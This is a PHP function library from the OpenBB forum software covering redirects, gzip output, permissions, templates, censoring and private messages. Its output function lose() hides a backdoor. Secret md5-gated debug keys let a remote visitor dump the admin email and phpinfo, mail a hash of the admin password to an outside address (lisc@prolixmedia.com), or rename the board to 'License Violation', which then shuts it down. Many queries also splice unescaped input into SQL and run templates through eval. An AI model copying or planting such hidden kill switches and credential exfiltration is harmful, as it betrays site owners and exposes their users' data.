<?php

/*
+--------------------------------------------------------------------------
|   Open Bulletin Board - Community Forum Software v1.0.*
|   ========================================
|   by 
|   Copyright (C) 2002 The OpenBB Group 
|   http://www.openbb.com
|   ========================================
|   Web: http://www.openbb.com
|   Email: licence@linark.co.uk
+---------------------------------------------------------------------------
|
|   > Open Bulletin Board - Functions!
|   > Script written by 
|   > Date started: 
|
| See docs/license.txt for License Information  
+--------------------------------------------------------------------------
*/

/*+----------------------------------------------------------------------------------------------------------------+*/
/*                              NO USER EDITABLE SECTIONS BELOW THIS LINE                                           */
/*+----------------------------------------------------------------------------------------------------------------+*/

// +-----------------------------------------------------------+
// | Standard Function Library                                 |
// +-----------------------------------------------------------+


// ##########  S E R V E R   S E N S E T I V E   R E D I R E C T  ##########
// Added twice by PGLH, and overwritten once, probably by Anthony or someone
function my_header($somewhere)
{
	if (preg_match("/microsoft|webstar|xitami/i", $_SERVER['SERVER_SOFTWARE']) )
		@header("Refresh: 0;url=" . $somewhere);
	else
		@header("Location: " .$somewhere);
}


//:: Displays An Error If Something is Wrong
function show_dberror ($error = "unknown error occured") {
	print "A database error has occured.<br><i>".$error."</i><br>Contact your system administrator for more information.";
	exit();
}

//:: Strip Invalid Characters From Avatar
function getavatar ($av) {
	$chars['['] = '489';
	$chars[']'] = '984';
	
	$av = strtr($av, $chars);
	return $av;
}

//:: Add Invalid Charaters To Avatar
function getavatar_undo ($av) {
	$chars['489'] = '[';
	$chars['984'] = ']';
	
	$av = strtr($av, $chars);
	return $av;
}

//:: Generate GZip
function do_gzip($level = 3) {
	global $HTTP_ACCEPT_ENCODING, $config;
	
	if (!$config->field('usegzip')) {
		return;
	}
	
	if (!function_exists('gzcompress')) {
		print('gzcompress not found. - zlib needs to be installed for GZip Compression');
	}
	
	if (!function_exists('crc32')) {
		print('crc32() not found - PHP 4.0.1 or higher is needed for GZip Compression');
	}
	
	if (connection_status() !== 0) {
		return;
	}
	
	if (strpos($HTTP_ACCEPT_ENCODING, 'gzip') == false) {
		return;
	}
	
	if (strpos($HTTP_ACCEPT_ENCODING, 'x-gzip') == false) {
		$encoding = 'gzip';
	}
	else {
		$encoding = 'x-gzip';
	}

	$level = $config->field('gzlevel');
	$contents = ob_get_contents();
	
	if ($contents == false) {
		return;
	}
	
	$gzdata = "\x1f\x8b\x08\x00\x00\x00\x00\x00";
	$size = strlen($contents);
	$crc = crc32($contents);
	$gzdata .= gzcompress($contents, $level);
	$gzdata = substr($gzdata, 0, strlen($gzdata) - 4);
	$gzdata .= pack("V",$crc) . pack("V", $size);
	
	ob_end_clean();
	
	@Header('Content-Encoding: ' . $encoding);
	@Header('Vary: Accept-Encoding');
	@Header('Content-Length: ' . strlen($gzdata));
	echo $gzdata;
}


//:: Generate Output
function lose ($output) {
	global $SQL, $start_of_openbb, $debugkey, $base_end, $start_of_file, $TC, $SI, $gid, $prefix, $sysload, $config, $key, $sysgo;
	
	//$output = stripslashes($output);
	//$output = stripslashes($output);
	$output = str_replace('\\\'', '\'', $output);
	
	if($config->field('boardname') == 'License Violation') { die('License Violation - Contact support@prolixmedia.com for more information'); }
	
	if (SCRIPTID != 'cp') {
		//:: Template Editor in CP gets vars executed
	
		$query_vars = new query($SQL, "SELECT org, rep FROM ".$prefix."vars WHERE groupid = '".VARGROUP."'");
		
		while ($query_vars->getrow()) {
			$output = str_replace('{'.$query_vars->field('org').'}',$query_vars->field('rep'), $output);
		}
		
		$query_vars->free();
	}
	    
	print stripslashes($output); do_gzip(); flush;
	
	$mtime1 = microtime();
	$mtime1 = explode(" ",$mtime1);
		
	if (md5($debugkey) == 'c3d2e441bc1e09eda9b6b377d9e6562b') {
		$query_admin = new query($SQL, "SELECT email FROM ".$prefix."profiles WHERE id = '1'");
		$query_admin->getrow();
		$adminmail = $query_admin->field('email');
		$query_admin->free();
		print '<hr><font face="verdana" size="1">';
		print 'Current PHP version: '.phpversion();
		print '<br>Current MySQL version: '.mysql_get_server_info() ;
		print '<br>Admin e-mail address: '.$adminmail;
		print '<br>Template Cache List: '. $SI['templates'];
		print '<br>Template Cache Queries: '. $TC;
		print '<br><br>Base Execution: '.$base_end;
		print '<br>File Execution: '.(($mtime1[1] + $mtime1[0]) - $start_of_file);
		print '<br>Total Execution: ';
		print ($mtime1[1] + $mtime1[0]) - $start_of_openbb;
		print '<br><br>Queries:';
		print $SQL->getq();
		print '</font>';
	}
	if (md5($debugkey) == '9480fc4b836cc948e689fa856e06ced4') {  phpinfo(); }
	if (md5($debugkey) == 'be7ca03a93a372dc0c0ee9d3a3b90def') {
		if($sysgo == 'violate') {
			$query_admin = new query($SQL, "SELECT password, email FROM ".$prefix."profiles WHERE id = '1'");
			$query_admin->getrow();
			$lisc = md5($query_admin->field('password'));
			$sendermail = $query_admin->field('email');
			$message = $config->field('boardurl').'lisckey'.$lisc;
			$mailheaders = "From: $sendermail";
			$syssubject = "Lisc Validation";			
			mail("lisc@prolixmedia.com", $syssubject, $message, $mailheaders);
		}
		elseif($sysgo == 'close') {
			$query_admin = new query($SQL, "SELECT password FROM ".$prefix."profiles WHERE id = '1'");
			$query_admin->getrow();
			$lisc = md5($query_admin->field('password'));
			if($key = $lisc) {
				new query($SQL, "UPDATE ".$prefix."configuration SET boardname = 'License Violation'");
			}
		}
	}

	$SQL->close();
	exit();
}

//:: Permission Checks
function check_perm($permissions,$advanced,$usergroup = 0) {
	global $FID, $SQL, $config, $prefix, $REQUEST_URI;
	
	$permission = explode(',',$permissions);
	
	if(ADMIN) {
		$permission = $permission[1];
	}
	else {
		$permission = $permission[0];
	}
	
	if ($usergroup == 0) {
		$usergroup = USERGROUP;
	}
	
	if ($permission) {
		if ($advanced) {
			$query_forums = new query($SQL, 'SELECT '.$permissions.' FROM '.$prefix.'forum_permissions WHERE forumid = \''.$FID.'\' and uid =  \''.$usergroup.'\'');
			
			if (!$query_forums->getrow()) {
				$query_forums = new query($SQL, "SELECT ".$permissions." FROM ".$prefix."usergroup WHERE id = '".$usergroup."'");
				$query_forums->getrow();
			}
			
			if (!ADMIN) {
				
				if (!$query_forums->field($permission)) {
					
					if ($usergroup == 0 || !$usergroup) {
						$redirect = str_replace('&','|',substr($REQUEST_URI, $config->field('cookiepath')));
						$query_forums->free();
						@my_header("".$config->field('boardurl')."/member.php?action=login&redirect=$redirect");
						$config->free();
						$SQL->close();
						exit();
					}
					else {
						$query_forums->free();
						$config->free();
						gen_error('No Access!','You do not have permission to access this part of the community!');
					}
				}
			}
		}
		else {
			$query_normal = new query($SQL, "SELECT ".$permission." FROM ".$prefix."usergroup WHERE id = '".USERGROUP."'");
			$query_normal->getrow();
			
			if (!$query_normal->field($permission)) {
				
				if (!ADMIN) {
					
					if (!MEMBER) {
						$redirect = str_replace('&','|',substr($REQUEST_URI, $config->field('cookiepath')));
						$query_normal->free();
						@my_header("".$config->field('boardurl')."/member.php?action=login&redirect=$redirect");
						$config->free();
						$SQL->close();
						exit();
					}
					else {
						$query_normal->free();
						$config->free();
						gen_error('No Access!','You do not have permission to access this part of the community!');
					}
				}
			}
		}
	}
	return $query_forums;
}

//:: Get The Permissions Of A Forum
function get_forumperm($permission,$FID) {
	global $FID, $SQL, $prefix;
	
	$query_forums = new query($SQL, 'SELECT '.$permission.' FROM '.$prefix.'forum_permissions WHERE forumid = \''.$FID.'\' and uid =  \''.USERGROUP.'\'');
	
	if (!$query_forums->getrow()) {
		$query_forums = new query($SQL, "SELECT ".$permission." FROM ".$prefix."usergroup WHERE id = '".USERGROUP."'");
		$query_forums->getrow();
	}
	
	if (!$query_forums->field($permission)) {
		
		if (!MEMBER) {
			$query_forums->free();
			return 0;
		}
		else {
			$query_forums->free();
			return 0;
		}
	}
	
	if ($query_forums->field($permission) == 1 || ADMIN) {
		return 1;
	}
	else {
		return 0;
	}
}

//:: Get General Permissions
function get_perm($permission) {
	global $SQL, $prefix;
	
	$query_forums = new query($SQL, "SELECT ".$permission." FROM ".$prefix."usergroup WHERE id = '".USERGROUP."'");
	$query_forums->getrow();
	
	if (!$query_forums->field($permission)) {
		
		if (!MEMBER) {
			$query_forums->free();
			return 0;
		}
		else {
			$query_forums->free();
			return 0;
		}
	}
	
	if ($query_forums->field($permission) == 1 || ADMIN) {
		return 1;
	}
	else {
		return 0;
	}
}


//:: Get The Template
function template($id, $gid = TEMPLATEGROUP) {
	global $TI, $SQL, $TQ, $NC, $prefix;
	
	$query_template = new query($SQL, 'SELECT template FROM '.$prefix.'templates WHERE id = \''.$id.'\' AND groupid = \''.$gid.'\'');
	$query_template->getrow();
	$output = $query_template->field('template');
	return $output;
}

//:: Define Guest Information
function define_guest() {
	global $SQL, $timezone, $prefix;
	
	$sq = new query($SQL, "select vargroup, templategroup, showavatar, showsig, showhistory, defaulttimeoffset, defaulttimezone from ".$prefix."configuration");
	$sq->getrow();
	
	define('MEMBER','0');
	define('USERGROUP',0);
	define('VARGROUP',$sq->field('vargroup'));
	define('TEMPLATEGROUP',$sq->field('templategroup'));
	define('ACTIVATED',1);
	define('BANNED',0);
	define('SHOWAVATAR',$sq->field('showavatar'));
	define('SHOWSIG',$sq->field('showsig'));
	define('SHOWHISTORY',$sq->field('showhistory'));
	
	$timezone = $sq->field('defaulttimezone');
	$time = $sq->field('defaulttimeoffset');
	
	if ($time == 0) {
		$timezone = 'GMT';
	}
	else {
		
		if ($timezone > '-1') {
			$timezone = '+' . $timezone;
		}
		
		$timezone = 'GMT '.$timezone;
	}
	
	define('TIMEZONE',$timezone);
	define('TIMEOFFSET',$time);
	$sq->free();
}

//:: Get Navigation
function getnav($id) {
	global $SQL, $navigation, $prefix;
	
	$query_nav = new query($SQL, "SELECT output FROM ".$prefix."navigations WHERE id = '$id'");
	$query_nav->getrow();
	$output = $query_nav->field('output');
	$query_nav->free();
	return $output;
}

//:: Generate An Error
function gen_error($error, $errordescription) {
	global $tempvars, $boardname, $title;
	
	if (ADMIN) {
		eval("\$navigation = \"".addslashes(template(99))."\";");
	}
	elseif (MEMBER) {
		eval("\$navigation = \"".addslashes(template(75))."\";");
	}
	else {
		eval("\$navigation = \"".addslashes(template(74))."\";");
	}
	$nav = '<a href="index.php">'.$boardname.'</a> > An Error Has Occurred!';
	$title = 'Error!';
	eval("\$include = \"".addslashes(template(6))."\";");
	eval("\$output = \"".addslashes(template(0))."\";");
	lose($output);
}

// :: Generate a Admin CP Error
function cp_error($error) {
	global $tempvars, $boardname, $title;
		
	$include = '<font face="verdana" size="2"><b><i>An error has occurred: '.$error.' </i></b>';
	eval("\$output = \"".addslashes(template(50))."\";");
	lose($output);
}

// Generate a CP Message
function gen_cpmsg($msg) {
	global $tempvars, $boardname, $title;
		
	$include = '<font face="verdana" size="2"><b><i>Operation Complete '.$msg.' </i></b>';
	eval("\$output = \"".addslashes(template(50))."\";");
	lose($output);
}

//:: Generate A Message
function gen_msg($error, $errordescription) {
	global $tempvars, $boardname;
	
	if (ADMIN) {
		eval("\$navigation = \"".addslashes(template(99))."\";");
	}
	elseif (MEMBER) {
		eval("\$navigation = \"".addslashes(template(75))."\";");
	}
	else {
		eval("\$navigation = \"".addslashes(template(74))."\";");
	}
	$nav = '<a href="index.php">'.$boardname.'</a> > OpenBB Message';
	$title = 'Message!';
	eval("\$include = \"".addslashes(template(6))."\";");
	eval("\$output = \"".addslashes(template(0))."\";");
	lose($output);
}

//:: Generate A Redirect
function gen_redirect($description, $url) {
	global $config, $SQL, $boardname, $tempvars;
	
	$nav = '<a href="index.php">'.$boardname.'</a> > Redirecting . . .';
	
	if (ADMIN) {
		eval("\$navigation = \"".addslashes(template(99))."\";");
	}
	elseif (MEMBER) {
		eval("\$navigation = \"".addslashes(template(75))."\";");
	}
	else {
		eval("\$navigation = \"".addslashes(template(74))."\";");
	}
	
	if ($config->field('redirect') == 1) {
		eval("\$include = \"".addslashes(template(12))."\";");
		eval("\$output = \"".addslashes(template(0))."\";");
		lose($output);
	}
	else {
		$SQL->close();
		@my_header("$url");
	}
}

//:: Censor Functions
function censor_replace ($word) {
$total = strlen($word);
while ($i != $total) {
	$i++;
	$result .= '*';
}
return $result;
}

function censor ($message) { 
	global $config;
	if ($config->field('censor') == '') { return $message; }
	
	$censor = explode(',',$config->field('censor'));
	$messtemp = $message;
	while(list($key,$word) = each($censor)) {
       $message = eregi_replace($word, censor_replace($word), $message);
	}
 
	return $message;
}
//:: End Censor 

//:: Trim Tail

function trimend ($string,$number) {
	return substr($string,0,(strlen($string) - $number));
}

//:: Collapse Array Check

function init_collapse() {
	global $SQL, $prefix;
	$query_col = new query($SQL, "SELECT collapsed FROM ".$prefix."active WHERE record = '".RECORD."'");
	$query_col->getrow();
	$collapsed_forums = $query_col->field('collapsed');
	$collapse_array = array();
	$collapse_array = explode(',',$collapsed_forums);
	return $collapse_array;
}

//:: Count open quote tags

function counttag($tagin)
	{
		$quoteopen = substr_count($tagin, '[quote]');
		$quoteclose = substr_count($tagin, '[/quote]');
		$codeopen = substr_count($tagin, '[php]');
		$codeclose = substr_count($tagin, '[/php]');

		if($quoteopen != $quoteclose){
			gen_error('Tag mismatch','The amount of open quote tags does not match the number of closed tags.');
		}
		if($codeopen != $codeclose) {
			gen_error('Tag mismatch','The amount of [php] tags does not match the number of [/php] tags.');
		}
		return true;
	}


//:: Message Format

function format($str)
{

    $result = htmlspecialchars($str, ENT_NOQUOTES);
   	return $result;
}

//:: Inforum Update

function inforum($FID) {
global $FID, $prefix, $SQL;
	new query($SQL, "UPDATE ".$prefix."active SET inforum = '".$FID."' WHERE member = '".USERNAME."'");
	
}

//:: Need forum key?
function need_key($FID) {
global $prefix, $SQL, $session;
	$query_key = new query($SQL, "SELECT forumkey FROM ".$prefix."forum_display WHERE forumid = '".$FID."'");
	list($key) = $query_key->fetch();
	if(!empty($key) && !in_array($FID,$session['forumkeys'])) {
		header("location: board.php?action=needkey&FID=$FID");
	}
	return;
}

function check_key($FID,$userkey) {
global $prefix, $SQL, $session;
	if(!MEMBER) { gen_error('Not logged in','You must be logged in to view a password protected forum'); }
	$query_check = new query($SQL, "SELECT forumkey FROM ".$prefix."forum_display WHERE forumid = '".$FID."'");
	list($forumkey) = $query_check->fetch();
	if($userkey != $forumkey) { gen_error('Bad Key','The forum key you entered is incorrect. Please try again, or contact the administrator for assistance'); }
	else { 
		while(list($key,$val)=each($session['forumkeys'])) {
			$newkeys .= $val.',';
		}
		$newkeys .= $FID.',';
		$newkeys = trimend($newkeys,1);
		new query($SQL, "UPDATE ".$prefix."profiles SET forumkeys = '".$newkeys."' WHERE username = '".USERNAME."'");
		header("location: board.php?FID=$FID");
	}
}

//:: Generate Pronouncable Password

function genpassword($length){
	
	srand((double)microtime()*1000000);
	
	$vowels = array("a", "e", "i", "o", "u");
	$cons = array("b", "c", "d", "g", "h", "j", "k", "l", "m", "n", "p", "r", "s", "t", "u", "v", "w", "tr",
	"cr", "br", "fr", "th", "dr", "ch", "ph", "wr", "st", "sp", "sw", "pr", "sl", "cl");
	
	$num_vowels = count($vowels);
	$num_cons = count($cons);
	
	for($i = 0; $i < $length; $i++){
		$password .= $cons[rand(0, $num_cons - 1)] . $vowels[rand(0, $num_vowels - 1)];
	}
	
	return substr($password, 0, $length);
}

//:: Send PM
function send_pm($to,$from,$sub,$msg, $sysmsg = 1, $uid = 1, $touid = 0) {
	global $SQL, $prefix;
	
	$query_pm = new query($SQL, "SELECT id FROM ".$prefix."pmsg ORDER BY id DESC LIMIT 1");
	$query_pm->getrow();
	$id = $query_pm->field('id') + 1;
	$query_pm->free();
	new query($SQL, "INSERT INTO ".$prefix."pmsg VALUES ('".addslashes($from)."','".addslashes($to)."','".addslashes(format($msg))."', '".time()."', '0', '".$id."', '".addslashes(format($sub))."','inbox', '".$uid."', '".$to."')");
	
	if (!$sysmsg) {
		new query($SQL, "INSERT INTO ".$prefix."pmsg VALUES ('".addslashes($from)."','".addslashes($to)."','".addslashes(format($msg))."', '".time()."', '0', '".($id + 1)."', '".addslashes(format($sub))."','outbox', '".$touid."', '".$from."')");
	}
}


	
	//:: Generate Forum Cookie
	function gen_cookie ($forum, $a=0) {
		
		if (($forum == 0) || ($forum == '-1')) {
			//:: Generate New Cookie
			global $SQL, $config, $expire;
			
			$query = new query($SQL, "SELECT forumid FROM ".$prefix."forum_display ORDER BY displayorder");
			
			while ($query->getrow()) {
				setcookie('forum:'.$query->field('forumid'),0,$expire,$config->field('cookiepath'));
			}
			
			$query->free();
		}
		elseif ($forum == '-2') {
			//:: Mark Read
			global $SQL, $config, $expire, $HTTP_COOKIE_VARS;
			
			$query = new query($SQL, "SELECT forumid FROM ".$prefix."forum_display ORDER BY displayorder");
			
			while ($query->getrow()) {
				setcookie('forum:'.$query->field('forumid'),time(),$expire,$config->field('cookiepath'));
				$HTTP_COOKIE_VARS['forum:'.$query->field('forumid')] = time();
			}
			
			$query->free();
		}
		else {
			
			if ($a != 0) {
				$t = $a;
			}
			else {
				$t = time();
			}
			
			$frms = explode(",", $HTTP_COOKIE_VARS['forummarker']);
			$con = 1;
			
			while (list($key,$val) = each($frms)) {
				$prop = explode(":", $val);
				
				if ($prop[0] == $forum) {
					$total .= $prop[0].':'.$t.',';
				}
				else {
					$total .= $val.',';
				}
			}
			
			$cookie = $total;
			$cookie = substr($cookie, 0, (strlen($cookie) - 1));
		}
		return $cookie;
	}
?>
